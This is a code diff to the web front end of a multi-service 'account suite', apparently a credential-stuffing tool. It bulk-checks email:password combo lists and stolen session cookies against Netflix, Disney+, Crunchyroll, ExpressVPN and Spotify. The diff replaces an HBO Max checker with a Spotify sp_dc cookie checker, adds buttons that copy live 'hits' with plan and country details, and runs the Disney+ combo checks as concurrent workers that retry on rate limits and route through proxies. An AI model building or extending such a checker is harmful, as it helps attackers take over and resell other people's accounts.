@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>NF-Sawava Suite — Netflix, Disney+, Crunchyroll, ExpressVPN & HBO Max Suite</title>
+<title>NF-Sawava Suite — Netflix, Disney+, Crunchyroll, ExpressVPN & Spotify Suite</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
@@ -172,71 +172,54 @@ body.expressvpn-body {
     linear-gradient(180deg, rgba(255, 255, 255, 0.01) 0%, transparent 100%);
 }
 
+/* Spotify theme (green) */
+.spotify-theme {
+  --primary: #1DB954;
+  --primary-hover: #1aa34a;
+  --primary-glow: rgba(29, 185, 84, 0.25);
+  --border-focus: #1DB954;
+}
+
+.spotify-theme .brand-icon {
+  background: linear-gradient(135deg, #1DB954 0%, #0d7a35 100%) !important;
+}
+
+.spotify-theme .tab-btn.active {
+  border-color: rgba(29, 185, 84, 0.3) !important;
+  box-shadow: 0 4px 12px rgba(29, 185, 84, 0.15) !important;
+}
+
+.spotify-theme .control-ribbon {
+  border-color: rgba(29, 185, 84, 0.15);
+}
+
+.spotify-theme input[type="checkbox"]:checked {
+  accent-color: #1DB954;
+}
+
+.spotify-theme .btn-primary {
+  background: #1DB954;
+  color: #fff;
+  box-shadow: 0 4px 14px rgba(29, 185, 84, 0.25);
+}
+
+.spotify-theme .btn-primary:hover {
+  background: #1aa34a;
+}
+
+body.spotify-body {
+  background-image:
+    radial-gradient(ellipse 80% 50% at 50% -20%, rgba(29, 185, 84, 0.12), transparent 70%),
+    linear-gradient(180deg, rgba(255, 255, 255, 0.01) 0%, transparent 100%);
+}
+
 body.crunchyroll-body {
   background-image:
     radial-gradient(ellipse 80% 50% at 50% -20%, rgba(244, 117, 33, 0.12), transparent 70%),
     linear-gradient(180deg, rgba(255, 255, 255, 0.01) 0%, transparent 100%);
 }
 
-/* HBO Max theme (purple) */
-.hbomax-theme {
-  --primary: #b01bef;
-  --primary-hover: #8d15bf;
-  --primary-glow: rgba(176, 27, 239, 0.25);
-  --border-focus: #b01bef;
-}
 
-.hbo-mode-btn {
-  transition: all 0.2s;
-  cursor: pointer;
-}
-.hbo-mode-btn.active {
-  background: var(--primary) !important;
-  color: #fff !important;
-  border-color: var(--primary) !important;
-}
-.hbo-bulk-mode-btn {
-  transition: all 0.2s;
-  cursor: pointer;
-}
-.hbo-bulk-mode-btn.active {
-  background: var(--primary) !important;
-  color: #fff !important;
-  border-color: var(--primary) !important;
-}
-
-.hbomax-theme .brand-icon {
-  background: linear-gradient(135deg, #b01bef 0%, #6b0f91 100%) !important;
-}
-
-.hbomax-theme .tab-btn.active {
-  border-color: rgba(176, 27, 239, 0.3) !important;
-  box-shadow: 0 4px 12px rgba(176, 27, 239, 0.15) !important;
-}
-
-.hbomax-theme .control-ribbon {
-  border-color: rgba(176, 27, 239, 0.15);
-}
-
-.hbomax-theme input[type="checkbox"]:checked {
-  accent-color: #b01bef;
-}
-
-.hbomax-theme .btn-primary {
-  background: #b01bef;
-  color: #fff;
-  box-shadow: 0 4px 14px rgba(176, 27, 239, 0.25);
-}
-
-.hbomax-theme .btn-primary:hover {
-  background: #8e15c0;
-}
-
-body.hbomax-body {
-  background-image:
-    radial-gradient(ellipse 80% 50% at 50% -20%, rgba(176, 27, 239, 0.12), transparent 70%),
-    linear-gradient(180deg, rgba(255, 255, 255, 0.01) 0%, transparent 100%);
-}
 
 * { box-sizing: border-box; margin: 0; padding: 0; }
 
@@ -348,7 +331,7 @@ body {
 /* Tabs */
 .tabs {
   display: grid;
-  grid-template-columns: repeat(6, 1fr);
+  grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
   gap: 6px;
   background: var(--bg-input);
   padding: 5px;
@@ -976,10 +959,10 @@ tbody tr:hover {
     <div class="brand">
       <div class="brand-icon">N</div>
       <div class="brand-text">
-        <h1>Netflix <span>Suite Pro</span></h1>
-        <div class="sub">Token Generator & Realtime Membership Checker</div>
+        <h1>NF-Sawava <span>Suite Ultra</span></h1>
+        <div class="sub">Multi-Service Account Suite — Netflix, Disney+, CR, EVPN, Spotify</div>
       </div>
-      <span class="badge">v6.1 Elite</span>
+      <span class="badge">v7.0 Ultra</span>
     </div>
     <div class="status-bar-top">
       <div class="pill-tag">
@@ -997,7 +980,7 @@ tbody tr:hover {
     <button class="tab-btn" onclick="switchTab('disney')">Disney+</button>
     <button class="tab-btn" onclick="switchTab('crunchyroll')">Crunchyroll</button>
     <button class="tab-btn" onclick="switchTab('expressvpn')">ExpressVPN</button>
-    <button class="tab-btn" onclick="switchTab('hbomax')">HBO Max</button>
+    <button class="tab-btn" onclick="switchTab('spotify')">Spotify</button>
     <button class="tab-btn" onclick="switchTab('bulk')">Concurrent Bulk</button>
     <button class="tab-btn" onclick="switchTab('history')">History DB</button>
     <button class="tab-btn" onclick="switchTab('proxies')">Proxy Manager</button>
@@ -1120,6 +1103,7 @@ tbody tr:hover {
         <div id="disney-bulk-stats" style="font-size:12px; font-weight:600; color:var(--text-muted);"></div>
         <div style="display:flex; gap:6px;">
           <button class="btn-secondary" style="padding:4px 10px; font-size:11px;" onclick="exportDisneyHits()">Export Hits</button>
+          <button class="btn-secondary" style="padding:4px 10px; font-size:11px;" onclick="copyDisneyHits()">Copy All Hits</button>
         </div>
       </div>
       <div id="disney-bulk-progress" style="margin-top:8px; display:none;">
@@ -1219,6 +1203,7 @@ tbody tr:hover {
         <div id="cr-bulk-stats" style="font-size:12px; font-weight:600; color:var(--text-muted);"></div>
         <div style="display:flex; gap:6px;">
           <button class="btn-secondary" style="padding:4px 10px; font-size:11px;" onclick="exportCrHits()">Export Hits</button>
+          <button class="btn-secondary" style="padding:4px 10px; font-size:11px;" onclick="copyCrHits()">Copy All Hits</button>
         </div>
       </div>
       <div id="cr-bulk-progress" style="margin-top:8px; display:none;">
@@ -1315,6 +1300,7 @@ tbody tr:hover {
         <div id="evpn-bulk-stats" style="font-size:12px; font-weight:600; color:var(--text-muted);"></div>
         <div style="display:flex; gap:6px;">
           <button class="btn-secondary" style="padding:4px 10px; font-size:11px;" onclick="exportEvpnHits()">Export Hits</button>
+          <button class="btn-secondary" style="padding:4px 10px; font-size:11px;" onclick="copyEvpnHits()">Copy All Hits</button>
         </div>
       </div>
       <div id="evpn-bulk-progress" style="margin-top:8px; display:none;">
@@ -1326,156 +1312,115 @@ tbody tr:hover {
     </div>
   </div>
 
-  <!-- PANEL: HBO MAX CHECKER -->
-  <div id="panel-hbomax" class="section-panel">
+  <!-- PANEL: SPOTIFY COOKIE CHECKER -->
+  <div id="panel-spotify" class="section-panel">
     <div style="display:flex; align-items:center; gap:10px; margin-bottom:12px;">
-      <div style="font-size:20px;">🎬</div>
+      <div style="font-size:20px;">🎵</div>
       <div>
-        <div style="font-weight:700; font-size:16px; color:var(--primary);">HBO Max Account Checker</div>
-        <div style="font-size:11px; color:var(--text-muted);">Check HBO Max / Max accounts via Comet API. Supports email:password & token/cookie mode</div>
+        <div style="font-weight:700; font-size:16px; color:var(--primary);">Spotify Cookie Checker</div>
+        <div style="font-size:11px; color:var(--text-muted);">Check Spotify accounts via cookies. Supports Netscape, JSON, or raw sp_dc format.</div>
       </div>
     </div>
 
-    <!-- Mode Switcher -->
-    <div style="display:flex; gap:6px; margin-bottom:12px;">
-      <button class="btn-secondary hbo-mode-btn active" id="hbo-mode-cred" onclick="switchHboMode('credentials')" style="flex:1; justify-content:center; font-size:12px; padding:8px 0;">🔑 Credentials (email:pass)</button>
-      <button class="btn-secondary hbo-mode-btn" id="hbo-mode-token" onclick="switchHboMode('token')" style="flex:1; justify-content:center; font-size:12px; padding:8px 0;">🍪 Token / Cookie</button>
-    </div>
-
-    <!-- Single HBO Max Check: Credentials Mode -->
-    <div id="hbo-cred-panel" class="card" style="padding:16px; margin-bottom:14px;">
-      <label style="font-size:12px; font-weight:600; margin-bottom:6px; display:block; color:var(--primary);">Single Account Check (Email:Password)</label>
-      <div style="display:flex; gap:8px;">
-        <input type="text" id="hbo-email" placeholder="email@example.com" style="flex:1;">
-        <input type="password" id="hbo-password" placeholder="password" style="flex:1;">
-      </div>
+    <!-- Single Spotify Check -->
+    <div class="card" style="padding:16px; margin-bottom:14px;">
+      <label style="font-size:12px; font-weight:600; margin-bottom:6px; display:block; color:var(--primary);">Single Cookie Check</label>
+      <textarea id="spotify-cookie" placeholder="Paste sp_dc cookie here (Netscape .txt, JSON array, or raw sp_dc=XXXXXX)..." style="height:120px;"></textarea>
       <div style="display:flex; align-items:center; gap:8px; margin-top:8px;">
-        <div class="toggle-wrap" onclick="document.getElementById('hbo-proxy-toggle').click()" style="margin:0;">
-          <input type="checkbox" id="hbo-proxy-toggle" onclick="event.stopPropagation()">
+        <div class="toggle-wrap" onclick="document.getElementById('spotify-proxy-toggle').click()" style="margin:0;">
+          <input type="checkbox" id="spotify-proxy-toggle" onclick="event.stopPropagation()">
           <span style="font-size:11px;">Pakai Proxy</span>
         </div>
       </div>
-      <button id="hbo-single-btn" class="btn-primary" onclick="runHboSingle()" style="margin-top:8px;">
-        <span id="hbo-single-btn-text">Check HBO Max Account</span>
+      <button id="spotify-single-btn" class="btn-primary" onclick="runSpotifySingle()" style="margin-top:8px;">
+        <span id="spotify-single-btn-text">Check Spotify Account</span>
       </button>
-      <div id="hbo-single-out" class="card-out"></div>
+      <div id="spotify-single-out" class="card-out"></div>
     </div>
 
-    <!-- Single HBO Max Check: Token/Cookie Mode -->
-    <div id="hbo-token-panel" class="card" style="padding:16px; margin-bottom:14px; display:none;">
-      <label style="font-size:12px; font-weight:600; margin-bottom:6px; display:block; color:var(--primary);">Token / Cookie Check</label>
-      <div style="font-size:10px; color:var(--text-dim); margin-bottom:8px; line-height:1.5;">
-        Paste salah satu format:<br>
-        • Raw JWT access_token (eyJ...)<br>
-        • refresh_token string<br>
-        • access_token=eyJ...&refresh_token=xxx<br>
-        • Key=value pairs (satu per baris)
-      </div>
-      <textarea id="hbo-token-input" placeholder="Paste access_token / refresh_token di sini..." style="height:100px; font-family:'JetBrains Mono',monospace; font-size:11px;"></textarea>
-      <div style="display:flex; align-items:center; gap:8px; margin-top:8px;">
-        <div class="toggle-wrap" onclick="document.getElementById('hbo-token-proxy-toggle').click()" style="margin:0;">
-          <input type="checkbox" id="hbo-token-proxy-toggle" onclick="event.stopPropagation()">
-          <span style="font-size:11px;">Pakai Proxy</span>
-        </div>
-        <span id="hbo-token-format-badge" style="font-size:10px; font-weight:600; color:var(--text-dim);">Format: Belum ada input</span>
-      </div>
-      <button id="hbo-token-btn" class="btn-primary" onclick="runHboTokenSingle()" style="margin-top:8px;">
-        <span id="hbo-token-btn-text">Check HBO Max Token</span>
-      </button>
-      <div id="hbo-token-out" class="card-out"></div>
-    </div>
-
-    <!-- HBO Max Stats Dashboard -->
-    <div id="hbo-stats-dashboard" class="card" style="padding:16px; margin-bottom:14px; display:none;">
+    <!-- Spotify Stats Dashboard -->
+    <div id="spotify-stats-dashboard" class="card" style="padding:16px; margin-bottom:14px; display:none;">
       <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:14px;">
         <div style="font-weight:700; font-size:13px; color:var(--primary);">📊 Session Stats</div>
-        <button class="btn-secondary" style="padding:3px 10px; font-size:10px;" onclick="resetHboStats()">Reset</button>
+        <button class="btn-secondary" style="padding:3px 10px; font-size:10px;" onclick="resetSpotifyStats()">Reset</button>
       </div>
       <div style="display:flex; gap:16px; align-items:center;">
         <div style="position:relative; width:100px; height:100px; flex-shrink:0;">
-          <canvas id="hbo-donut-chart" width="100" height="100"></canvas>
+          <canvas id="spotify-donut-chart" width="100" height="100"></canvas>
           <div style="position:absolute; inset:0; display:flex; flex-direction:column; align-items:center; justify-content:center; pointer-events:none;">
-            <span id="hbo-donut-total" style="font-size:20px; font-weight:800; color:var(--text-primary);">0</span>
+            <span id="spotify-donut-total" style="font-size:20px; font-weight:800; color:var(--text-primary);">0</span>
             <span style="font-size:9px; color:var(--text-muted); text-transform:uppercase; letter-spacing:1px;">Total</span>
           </div>
         </div>
         <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px; flex:1;">
           <div style="background:rgba(16,185,129,0.1); border:1px solid rgba(16,185,129,0.25); border-radius:var(--radius-sm); padding:8px 12px;">
-            <div style="font-size:10px; color:#6ee7b7; text-transform:uppercase; letter-spacing:0.5px;">Live</div>
-            <div id="hbo-stat-live" style="font-size:22px; font-weight:800; color:#10b981;">0</div>
+            <div style="font-size:10px; color:#6ee7b7; text-transform:uppercase; letter-spacing:0.5px;">Premium</div>
+            <div id="spotify-stat-live" style="font-size:22px; font-weight:800; color:#10b981;">0</div>
           </div>
-          <div style="background:rgba(245,158,11,0.1); border:1px solid rgba(245,158,11,0.25); border-radius:var(--radius-sm); padding:8px 12px;">
-            <div style="font-size:10px; color:#fcd34d; text-transform:uppercase; letter-spacing:0.5px;">Hold</div>
-            <div id="hbo-stat-hold" style="font-size:22px; font-weight:800; color:#f59e0b;">0</div>
+          <div style="background:rgba(56,189,248,0.1); border:1px solid rgba(56,189,248,0.25); border-radius:var(--radius-sm); padding:8px 12px;">
+            <div style="font-size:10px; color:#7dd3fc; text-transform:uppercase; letter-spacing:0.5px;">Free</div>
+            <div id="spotify-stat-free" style="font-size:22px; font-weight:800; color:#38bdf8;">0</div>
           </div>
           <div style="background:rgba(244,63,94,0.1); border:1px solid rgba(244,63,94,0.25); border-radius:var(--radius-sm); padding:8px 12px;">
-            <div style="font-size:10px; color:#fda4af; text-transform:uppercase; letter-spacing:0.5px;">Bad</div>
-            <div id="hbo-stat-bad" style="font-size:22px; font-weight:800; color:#f43f5e;">0</div>
+            <div style="font-size:10px; color:#fda4af; text-transform:uppercase; letter-spacing:0.5px;">Dead</div>
+            <div id="spotify-stat-dead" style="font-size:22px; font-weight:800; color:#f43f5e;">0</div>
           </div>
-          <div style="background:rgba(132,139,159,0.1); border:1px solid rgba(132,139,159,0.25); border-radius:var(--radius-sm); padding:8px 12px;">
-            <div style="font-size:10px; color:#94a3b8; text-transform:uppercase; letter-spacing:0.5px;">Error</div>
-            <div id="hbo-stat-error" style="font-size:22px; font-weight:800; color:#94a3b8;">0</div>
+          <div style="background:rgba(245,158,11,0.1); border:1px solid rgba(245,158,11,0.25); border-radius:var(--radius-sm); padding:8px 12px;">
+            <div style="font-size:10px; color:#fcd34d; text-transform:uppercase; letter-spacing:0.5px;">Error</div>
+            <div id="spotify-stat-error" style="font-size:22px; font-weight:800; color:#f59e0b;">0</div>
           </div>
         </div>
       </div>
       <div style="margin-top:12px;">
         <div style="display:flex; justify-content:space-between; font-size:11px; margin-bottom:4px;">
           <span style="color:var(--text-muted);">Hit Rate</span>
-          <span id="hbo-hit-rate" style="font-weight:700; color:var(--primary);">0%</span>
+          <span id="spotify-hit-rate" style="font-weight:700; color:var(--primary);">0%</span>
         </div>
         <div style="background:var(--bg-subtle); border-radius:6px; height:6px; overflow:hidden;">
-          <div id="hbo-hit-rate-bar" style="height:100%; width:0%; border-radius:6px; transition:width 0.4s; background:linear-gradient(90deg, #10b981, #b01bef);"></div>
+          <div id="spotify-hit-rate-bar" style="height:100%; width:0%; border-radius:6px; transition:width 0.4s; background:linear-gradient(90deg, #1DB954, #38bdf8);"></div>
         </div>
       </div>
     </div>
 
-    <!-- Bulk HBO Max Check -->
+    <!-- Bulk Spotify Check -->
     <div class="card" style="padding:16px;">
-      <label style="font-size:12px; font-weight:600; margin-bottom:6px; display:block; color:var(--primary);">Bulk Check (Combo & Cookies)</label>
+      <label style="font-size:12px; font-weight:600; margin-bottom:6px; display:block; color:var(--primary);">Bulk Cookie Check</label>
 
-      <!-- Bulk mode selector -->
-      <div style="display:flex; gap:6px; margin-bottom:10px;">
-        <button class="btn-secondary hbo-bulk-mode-btn active" id="hbo-bulk-mode-combo" onclick="switchHboBulkMode('combo')" style="flex:1; justify-content:center; font-size:11px; padding:6px 0;">📝 Combo List (email:pass)</button>
-        <button class="btn-secondary hbo-bulk-mode-btn" id="hbo-bulk-mode-files" onclick="switchHboBulkMode('files')" style="flex:1; justify-content:center; font-size:11px; padding:6px 0;">📁 Upload Cookie Files</button>
+      <!-- File Upload Zone -->
+      <div id="spotify-drop-zone" style="border:2px dashed var(--border); border-radius:var(--radius-md); padding:20px; text-align:center; margin-bottom:10px; cursor:pointer; transition:all 0.2s; background:var(--bg-subtle);"
+           onclick="document.getElementById('spotify-file-input').click()"
+           ondragover="event.preventDefault(); this.style.borderColor='var(--primary)'; this.style.background='rgba(29,185,84,0.08)';"
+           ondragleave="this.style.borderColor='var(--border)'; this.style.background='var(--bg-subtle)';"
+           ondrop="event.preventDefault(); this.style.borderColor='var(--border)'; this.style.background='var(--bg-subtle)'; handleSpotifyFiles(event.dataTransfer.files);">
+        <div style="font-size:28px; margin-bottom:6px;">📁</div>
+        <div style="font-size:12px; font-weight:600; color:var(--text-main);">Drag & Drop Cookie Files</div>
+        <div style="font-size:10px; color:var(--text-muted); margin-top:4px;">atau klik untuk browse • Supports .txt, .json, folder/multi-file</div>
+        <div id="spotify-file-info" style="font-size:11px; color:var(--primary); margin-top:8px; font-weight:600; display:none;"></div>
+        <input type="file" id="spotify-file-input" multiple accept=".txt,.json,.cookie,.cookies" style="display:none;" onchange="handleSpotifyFiles(this.files)">
       </div>
 
-      <!-- Combo text input -->
-      <div id="hbo-bulk-combo-area">
-        <textarea id="hbo-bulk-input" placeholder="Paste combo list (email:password per baris)..." style="height:120px;"></textarea>
+      <div style="display:flex; align-items:center; gap:8px; margin-bottom:6px;">
+        <span style="font-size:11px; color:var(--text-dim);">— atau paste manual di bawah —</span>
       </div>
 
-      <!-- File upload area -->
-      <div id="hbo-bulk-files-area" style="display:none;">
-        <div id="hbo-drop-zone" style="border:2px dashed var(--border); border-radius:var(--radius-lg); padding:28px 16px; text-align:center; cursor:pointer; transition:all 0.2s; background:var(--bg-input);" onclick="document.getElementById('hbo-file-input').click()">
-          <div style="font-size:28px; margin-bottom:8px;">📂</div>
-          <div style="font-weight:600; font-size:13px; color:var(--text-main);">Drag & drop cookie files di sini</div>
-          <div style="font-size:11px; color:var(--text-muted); margin-top:4px;">atau klik untuk browse · Netscape/JSON cookies · Multiple files = bulk check</div>
-          <div style="font-size:10px; color:var(--text-dim); margin-top:6px;">Format: .txt .json .cookie — satu file per akun</div>
-        </div>
-        <input type="file" id="hbo-file-input" multiple accept=".txt,.json,.cookie,.cookies" style="display:none;" onchange="handleHboCookieFiles(this.files)">
-        <div id="hbo-file-list" style="margin-top:10px; max-height:120px; overflow-y:auto;"></div>
-        <div style="display:flex; align-items:center; gap:8px; margin-top:8px;">
-          <span id="hbo-file-count" style="font-size:11px; font-weight:600; color:var(--text-muted);">0 file dipilih</span>
-          <button class="btn-secondary" style="padding:3px 10px; font-size:10px;" onclick="clearHboCookieFiles()">Clear All</button>
-        </div>
-      </div>
-
+      <textarea id="spotify-bulk-input" placeholder="Paste multiple sp_dc cookies (one per line, or blocks separated by empty lines)..." style="height:120px;"></textarea>
       <div style="display:flex; gap:8px; margin-top:8px;">
-        <button id="hbo-bulk-btn" class="btn-primary" style="flex:2;" onclick="runHboBulk()">Mulai Bulk Check</button>
-        <button class="btn-secondary" style="flex:1; justify-content:center;" onclick="stopHboBulk()">Stop</button>
+        <button id="spotify-bulk-btn" class="btn-primary" style="flex:2;" onclick="runSpotifyBulk()">Mulai Bulk Check</button>
+        <button class="btn-secondary" style="flex:1; justify-content:center;" onclick="stopSpotifyBulk()">Stop</button>
       </div>
       <div style="display:flex; justify-content:space-between; align-items:center; margin-top:8px;">
-        <div id="hbo-bulk-stats" style="font-size:12px; font-weight:600; color:var(--text-muted);"></div>
+        <div id="spotify-bulk-stats" style="font-size:12px; font-weight:600; color:var(--text-muted);"></div>
         <div style="display:flex; gap:6px;">
-          <button class="btn-secondary" style="padding:4px 10px; font-size:11px;" onclick="exportHboHits()">Export Hits</button>
+          <button class="btn-secondary" style="padding:4px 10px; font-size:11px;" onclick="exportSpotifyHits()">Export Hits</button>
+          <button class="btn-secondary" style="padding:4px 10px; font-size:11px;" onclick="copySpotifyHits()">Copy All Hits</button>
         </div>
       </div>
-      <div id="hbo-bulk-progress" style="margin-top:8px; display:none;">
+      <div id="spotify-bulk-progress" style="margin-top:8px; display:none;">
         <div style="background:var(--bg-subtle); border-radius:6px; height:6px; overflow:hidden;">
-          <div id="hbo-progress-bar" style="background:var(--primary); height:100%; width:0%; transition:width 0.3s;"></div>
+          <div id="spotify-progress-bar" style="background:var(--primary); height:100%; width:0%; transition:width 0.3s;"></div>
         </div>
       </div>
-      <div id="hbo-bulk-out" style="max-height:400px; overflow-y:auto; margin-top:12px;"></div>
+      <div id="spotify-bulk-out" style="max-height:400px; overflow-y:auto; margin-top:12px;"></div>
     </div>
   </div>
 
@@ -1562,7 +1507,7 @@ tbody tr:hover {
         <option value="disney">🟢 Disney+</option>
         <option value="crunchyroll">🟠 Crunchyroll</option>
         <option value="expressvpn">🟢 ExpressVPN</option>
-        <option value="hbomax">🟣 HBO Max</option>
+        <option value="spotify">🟢 Spotify</option>
       </select>
       <select id="hist-filter-status" onchange="resetPageAndLoad()" style="flex:1; margin-bottom:0;">
         <option value="">Semua Status</option>
@@ -1803,8 +1748,10 @@ document.addEventListener('keydown', (e) => {
   }
 });
 
+let historyAutoRefresh = null;
+
 function switchTab(tab) {
-  const tabs = ['single', 'disney', 'crunchyroll', 'expressvpn', 'hbomax', 'bulk', 'history', 'proxies', 'analytics'];
+  const tabs = ['single', 'disney', 'crunchyroll', 'expressvpn', 'spotify', 'bulk', 'history', 'proxies', 'analytics'];
   document.querySelectorAll('.tab-btn').forEach((btn, i) => {
     btn.classList.toggle('active', tabs[i] === tab);
   });
@@ -1815,8 +1762,8 @@ function switchTab(tab) {
 
   // Theme switching
   const container = document.querySelector('.container');
-  container.classList.remove('disney-theme', 'crunchyroll-theme', 'expressvpn-theme', 'hbomax-theme');
-  document.body.classList.remove('disney-body', 'crunchyroll-body', 'expressvpn-body', 'hbomax-body');
+  container.classList.remove('disney-theme', 'crunchyroll-theme', 'expressvpn-theme', 'spotify-theme');
+  document.body.classList.remove('disney-body', 'crunchyroll-body', 'expressvpn-body', 'spotify-body');
   if (tab === 'disney') {
     container.classList.add('disney-theme');
     document.body.classList.add('disney-body');
@@ -1826,12 +1773,18 @@ function switchTab(tab) {
   } else if (tab === 'expressvpn') {
     container.classList.add('expressvpn-theme');
     document.body.classList.add('expressvpn-body');
-  } else if (tab === 'hbomax') {
-    container.classList.add('hbomax-theme');
-    document.body.classList.add('hbomax-body');
+  } else if (tab === 'spotify') {
+    container.classList.add('spotify-theme');
+    document.body.classList.add('spotify-body');
   }
 
-  if (tab === 'history') loadHistory();
+  // Clear history auto-refresh when switching away
+  if (historyAutoRefresh) { clearInterval(historyAutoRefresh); historyAutoRefresh = null; }
+
+  if (tab === 'history') {
+    loadHistory();
+    historyAutoRefresh = setInterval(() => loadHistory(), 30000);
+  }
   if (tab === 'proxies') loadProxiesManager();
   if (tab === 'analytics') loadAnalytics();
 }
@@ -2415,7 +2368,7 @@ function renderHistoryTable(data) {
     const svcBadge = r.type === 'disney' ? '<span style="color:#1ce783;">🟢 Disney+</span>'
       : r.type === 'crunchyroll' ? '<span style="color:#f47521;">🟠 Crunchyroll</span>'
       : r.type === 'expressvpn' ? '<span style="color:#44b556;">🟢 ExpressVPN</span>'
-      : r.type === 'hbomax' ? '<span style="color:#b01bef;">🟣 HBO Max</span>'
+      : r.type === 'spotify' ? '<span style="color:#1DB954;">🟢 Spotify</span>'
       : '<span style="color:#e50914;">🔴 Netflix</span>';
     const statusTag = r.status === 'LIVE' ? '<span class="tag-live">● LIVE</span>'
       : r.status === 'HOLD' ? '<span class="tag-hold">⏸ HOLD</span>'
@@ -2426,7 +2379,7 @@ function renderHistoryTable(data) {
       : r.status === 'DEAD' ? '<span class="tag-dead">✕ DEAD</span>'
       : `<span class="tag-dead">⚠ ${r.status}</span>`;
     const identifier = r.email || (r.raw_cookie ? r.raw_cookie.split(':')[0] : '-');
-    const copyLabel = r.type === 'checker' ? 'Salin Cookie' : 'Salin Combo';
+    const copyLabel = (r.type === 'checker' || r.type === 'spotify') ? 'Salin Cookie' : 'Salin Combo';
     return `
     <tr>
       <td style="color:var(--text-muted); font-family:'JetBrains Mono', monospace; font-size:11px;">${r.created_at}</td>
@@ -2949,67 +2902,77 @@ async function runDisneyBulk() {
 
   let done = 0, live = 0, bad = 0, errors = 0;
   const total = lines.length;
+  const startTime = Date.now();
+  let currentIndex = 0;
+  const concurrency = 3;
 
-  for (const combo of lines) {
-    if (disneyBulkAbort) break;
+  async function worker() {
+    while (currentIndex < lines.length && !disneyBulkAbort) {
+      const idx = currentIndex++;
+      const combo = lines[idx];
 
-    const [email, ...pwParts] = combo.split(' | ')[0].trim().split(':');
-    const password = pwParts.join(':');
+      const [email, ...pwParts] = combo.split(' | ')[0].trim().split(':');
+      const password = pwParts.join(':');
 
-    let retries = 0;
-    let success = false;
-    while (retries < 3 && !success) {
-      try {
-        const res = await fetch('/api/disney/check', {
-          method: 'POST',
-          headers: getAuthHeaders({ 'Content-Type': 'application/json' }),
-          body: JSON.stringify({ email: email.trim(), password: password.trim(), use_proxy: useProxy })
-        });
+      let retries = 0;
+      let success = false;
+      while (retries < 3 && !success) {
+        try {
+          const res = await fetch('/api/disney/check', {
+            method: 'POST',
+            headers: getAuthHeaders({ 'Content-Type': 'application/json' }),
+            body: JSON.stringify({ email: email.trim(), password: password.trim(), use_proxy: useProxy })
+          });
 
-        if (res.status === 401) {
-          outEl.innerHTML += `<div style="padding:10px; color:#f43f5e; font-weight:600;">🔒 PIN tidak valid</div>`;
-          disneyBulkAbort = true;
-          break;
-        }
+          if (res.status === 401) {
+            outEl.innerHTML += `<div style="padding:10px; color:#f43f5e; font-weight:600;">🔒 PIN tidak valid</div>`;
+            disneyBulkAbort = true;
+            break;
+          }
 
-        if (res.status === 429) {
-          retries++;
-          await new Promise(r => setTimeout(r, 3000 * retries));
-          continue;
-        }
+          if (res.status === 429) {
+            retries++;
+            await new Promise(r => setTimeout(r, 3000 * retries));
+            continue;
+          }
 
-        const data = await res.json();
-        data.combo = combo;
-        disneyBulkResults.push(data);
-        success = true;
-
-        if (data.status === 'LIVE') live++;
-        else if (data.status === 'BAD' || data.status === 'DEAD') bad++;
-        else errors++;
-
-        outEl.innerHTML += renderDisneyResult({ ...data, email: email.trim(), _password: password.trim(), combo: combo.split(' | ')[0].trim() }, 'bulk');
-        outEl.scrollTop = outEl.scrollHeight;
-        updateDisneyStats(data.status);
-        if (data.status === 'LIVE') playAlert('live');
-        else if (data.status === 'HOLD') playAlert('hold');
-      } catch(e) {
-        retries++;
-        if (retries >= 3) {
-          errors++;
-          outEl.innerHTML += `<div style="padding:6px; font-size:11px; color:#f59e0b;">⚠️ ${email}: ${e.message}</div>`;
+          const data = await res.json();
+          data.combo = combo;
+          disneyBulkResults.push(data);
           success = true;
-        } else {
-          await new Promise(r => setTimeout(r, 2000));
+
+          if (data.status === 'LIVE') live++;
+          else if (data.status === 'BAD' || data.status === 'DEAD') bad++;
+          else errors++;
+
+          outEl.innerHTML += renderDisneyResult({ ...data, email: email.trim(), _password: password.trim(), combo: combo.split(' | ')[0].trim() }, 'bulk');
+          outEl.scrollTop = outEl.scrollHeight;
+          updateDisneyStats(data.status);
+          if (data.status === 'LIVE') playAlert('live');
+          else if (data.status === 'HOLD') playAlert('hold');
+        } catch(e) {
+          retries++;
+          if (retries >= 3) {
+            errors++;
+            outEl.innerHTML += `<div style="padding:6px; font-size:11px; color:#f59e0b;">⚠️ ${email}: ${e.message}</div>`;
+            success = true;
+          } else {
+            await new Promise(r => setTimeout(r, 2000));
+          }
         }
       }
+
+      done++;
+      barEl.style.width = `${(done / total * 100).toFixed(1)}%`;
+      const elapsed = (Date.now() - startTime) / 1000;
+      const speed = done / elapsed;
+      const eta = Math.ceil((total - done) / speed);
+      statsEl.innerHTML = `<span style="color:#10b981;">${live} LIVE</span> · <span style="color:#f43f5e;">${bad} BAD</span> · <span style="color:#f59e0b;">${errors} ERR</span> · ${done}/${total} · ${speed.toFixed(1)}/s · ETA: ${eta}s`;
     }
-
-    await new Promise(r => setTimeout(r, 1200));
-
-    done++;
-    barEl.style.width = `${(done / total * 100).toFixed(1)}%`;
-    statsEl.innerHTML = `<span style="color:#10b981;">${live} LIVE</span> · <span style="color:#f43f5e;">${bad} BAD</span> · <span style="color:#f59e0b;">${errors} ERR</span> · ${done}/${total}`;
   }
+
+  const workers = Array.from({ length: Math.min(concurrency, lines.length) }, () => worker());
+  await Promise.all(workers);
 
   disneyBulkRunning = false;
   if (disneyBulkAbort) statsEl.innerHTML += ' · <span style="color:#f59e0b;">STOPPED</span>';
@@ -3030,6 +2993,13 @@ function exportDisneyHits() {
   a.download = `disney_hits_${new Date().toISOString().slice(0,10)}.txt`;
   a.click();
   showToast(`${hits.length} hits exported`);
+}
+
+function copyDisneyHits() {
+  const hits = disneyBulkResults.filter(r => r.status === 'LIVE');
+  if (!hits.length) return showToast('Belum ada hits untuk dicopy');
+  const text = hits.map(h => `${h.combo} | Plan: ${h.plan || 'N/A'} | Country: ${h.country || 'N/A'} | Renewal: ${h.renewal_date || 'N/A'}`).join('\n');
+  navigator.clipboard.writeText(text).then(() => showToast(`${hits.length} hits copied to clipboard`));
 }
 
 // Disney+ keyboard shortcut (Enter to check)
@@ -3151,43 +3121,54 @@ async function runCrBulk() {
